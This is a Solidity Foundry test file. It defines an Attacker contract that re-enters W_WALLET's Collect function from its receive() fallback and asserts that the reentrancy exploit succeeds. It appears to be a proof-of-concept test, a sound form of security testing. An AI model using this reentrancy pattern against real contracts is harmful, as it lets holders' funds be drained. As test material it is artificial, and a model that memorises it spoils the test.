
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET, Log} from "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {
    W_WALLET public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        _contractUnderTest = new W_WALLET(address(log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);

        vm.warp(block.timestamp + 1);

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;
    bool public reenteredBeforeUpdate;

    constructor(address victimAddress) { 
        victim = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Put{value: val * 2}(block.timestamp);
    }

    function attack(uint256 val) public {
        attackAmount = val;
        initialSnapshot = victim.Acc(address(this)).balance;

        victim.Collect(val);

        if (attackCallCount == 2 && reenteredBeforeUpdate) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            if (victim.Acc(address(this)).balance == initialSnapshot) {
                reenteredBeforeUpdate = true;
            }
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }
}
